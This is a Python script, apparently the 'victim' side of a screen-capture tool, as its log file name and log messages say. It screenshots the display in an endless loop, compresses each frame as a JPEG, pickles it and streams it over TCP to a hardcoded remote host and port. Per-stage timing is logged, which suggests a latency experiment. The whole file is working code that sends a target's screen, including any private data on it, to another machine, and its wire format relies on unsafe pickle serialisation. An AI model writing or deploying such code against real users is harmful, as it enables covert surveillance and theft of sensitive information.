import pickle
import struct
import time
import pyautogui
import socket
import numpy as np
import logging

from cv2 import cv2
from mss import mss
from zlib import compress
from PIL import Image


logFormatter = logging.Formatter(
    '%(asctime)s.%(msecs)d %(message)s',
    datefmt='%Y-%m-%dT%H:%M:%S',
)
LOGGER = logging.getLogger()
LOGGER.setLevel(logging.INFO)

fileHandler = logging.FileHandler('logs/screen_share_victima.log', mode='w')
fileHandler.setFormatter(logFormatter)
LOGGER.addHandler(fileHandler)

consoleHandler = logging.StreamHandler()
consoleHandler.setFormatter(logFormatter)
LOGGER.addHandler(consoleHandler)

FRAME_NUM = 0


def check_time():
    def decorator(func):
        def wrapper(*args, **kwargs):
            start = time.time()
            return_value = func(*args, **kwargs)
            end = time.time()

            LOGGER.info(f'victima:{func.__name__}:{(end - start) * 100:.2f}ms:{FRAME_NUM}')

            return return_value
        return wrapper
    return decorator


def send_screenshots(conn):
    global FRAME_NUM

    @check_time()
    def grab_screen():
        screen = pyautogui.screenshot()
        frame_ = np.array(screen)
        return frame_

    @check_time()
    def process_img():
        frame_ = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        frame_ = cv2.resize(frame_, (1200, 720), interpolation=cv2.INTER_AREA)
        return frame_

    @check_time()
    def send_img():
        result, pixels_ = cv2.imencode('.jpg', pixels, [int(cv2.IMWRITE_JPEG_QUALITY), 90])
        data = pickle.dumps(pixels_, 0)
        size = len(data)
        conn.sendall(struct.pack('>L', size) + data)

    while 'recording':
        FRAME_NUM += 1
        frame = grab_screen()
        pixels = process_img()
        send_img()


def main(host='192.168.0.139', port=9090):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    try:
        send_screenshots(sock)
    finally:
        sock.close()

    # try:
    #     while 'connected':
    #         thread = Thread(target=send_screenshots, args=(sock,))
    #         thread.start()
    # finally:
    #     sock.close()


if __name__ == '__main__':
    main()
    # send_screenshots(None)
